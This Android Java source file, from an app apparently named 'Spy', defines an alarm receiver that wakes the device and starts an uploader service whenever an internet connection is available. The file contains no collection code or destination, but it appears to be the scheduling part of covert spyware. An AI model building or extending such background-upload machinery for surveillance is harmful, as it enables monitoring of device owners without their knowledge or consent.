package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import com.gameofcoding.spy.services.UploaderService;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;

public class UploaderAlarm extends BroadcastReceiver {
    public static int i = 0;
    private static final String TAG = "UploaderAlarm";
    private static final String UPLOADER_ALARM_TAG = "Spy:UploaderAlarm";
    @Override
    public void onReceive(final Context context, final Intent intent) {
	XLog.i(TAG, "Uploading alarm received, starting UploaderService. (" + ++i + ")");
        final PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        final PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
							      UPLOADER_ALARM_TAG);
        wakeLock.acquire(10000); // Acquire the lock
	new Thread() {
	    @Override
	    public void run() {
		try {
		    Utils utils = new Utils(context);
		    if(utils.hasActiveInternetConnection()) {
			Intent serviceIntent = new Intent(context, UploaderService.class);
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
			    context.startForegroundService(serviceIntent);
			else
			    context.startService(serviceIntent);
		    }
		    else { XLog.v(TAG, "No internet available, not starting uploader service."); }
		} catch(Exception e) {
		    XLog.e(TAG, "Exception occured while checking for internet connection.", e);
		} finally {
		    wakeLock.release(); // Release the lock
		}
	    }
	}.start();
    }
}
